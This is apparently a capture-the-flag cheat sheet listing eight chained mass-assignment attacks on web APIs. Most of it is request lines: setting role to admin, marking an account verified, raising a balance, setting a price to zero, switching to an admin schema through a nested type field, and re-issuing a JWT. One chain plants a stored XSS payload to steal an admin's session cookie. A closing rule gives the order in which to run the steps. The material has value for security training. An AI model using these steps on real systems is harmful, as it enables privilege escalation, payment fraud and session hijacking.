# Multi-step chains — mass assignment as a link in a longer path

## Chain 1 — role → admin binder → flag field

```
PATCH /users/me {"role":"admin"}        # edge 1: bound role
GET /admin → 200                         # edge 2: role opens admin
POST /admin/users {"flag_visible":true}  # edge 3: admin binder's MA
GET /api/flag → flag                     # the flag field is now set
```

The bound role is the key; the admin binder is the second mass-
assignment; the flag field is the third write.

## Chain 2 — verified → gated route → flag

```
POST /register {"verified":true}         # edge 1: skip verification
GET /api/me → "verified":true            # confirm
GET /flag → flag                          # verify-gated flag opens
```

The bound `verified` is the edge; the flag route is the gate.

## Chain 3 — balance → purchase → flag item

```
PATCH /users/me {"balance":999999}       # edge 1: bound balance
POST /purchase {"item":"flag"}            # edge 2: balance suffices
GET /inventory → flag item                # the flag is the purchase
```

## Chain 4 — price → checkout → flag

```
POST /orders {"item":"flag","price":0}   # edge 1: bound price
POST /checkout {"order_id":9}             # edge 2: total = bound price
GET /orders/9 → flag item "owned"         # the flag is the order
```

## Chain 5 — ownership → admin feed → XSS → flag

```
POST /notes {"author_id":1,"content":"<img src=x onerror=...>"}
                                           # edge 1: forged authorship
→ admin's feed renders the note            # edge 2: stored XSS
→ admin bot visits → cookie stolen        # edge 3: XSS into web-xss
→ session rides to /flag                  # edge 4: the flag
```

Mass assignment → web-xss → auth-session — three classes chained.

## Chain 6 — plan → premium → flag

```
PATCH /users/me {"plan":"enterprise"}    # edge 1: bound plan
GET /premium → 200 + flag                # edge 2: plan gate opens
```

## Chain 7 — nested tunnel → discriminator → privileged schema

```
PATCH /users/me {"profile":{"_t":"AdminUser","role":"admin"}}
                                           # edge 1: nested discriminator
→ schema switches to AdminUser             # edge 2: privileged fields exist
PATCH /users/me {"clearance":"top"}         # edge 3: admin-only field binds
GET /flag                                  # edge 4: clearance-gated flag
```

## Chain 8 — role → JWT re-issue → flag

```
PATCH /users/me {"role":"admin"}         # edge 1: stored role
POST /logout; POST /login                # edge 2: re-issue the token
GET /admin → 200                          # edge 3: token now carries role
GET /flag                                 # edge 4: the flag
```

The bound field lands in the RE-ISSUED token's claim — the gate reads
the token, not the DB.

## The chain-order rule

Always bind the FIELD first, then exercise the GATE. The gate's check
runs on the stored state — the bound field must be in the store before
the gated request runs. And the chain's first edge is always the CHEAPEST
binder — `PATCH /me` before `POST /register` before `/import` before
`/admin/*`.
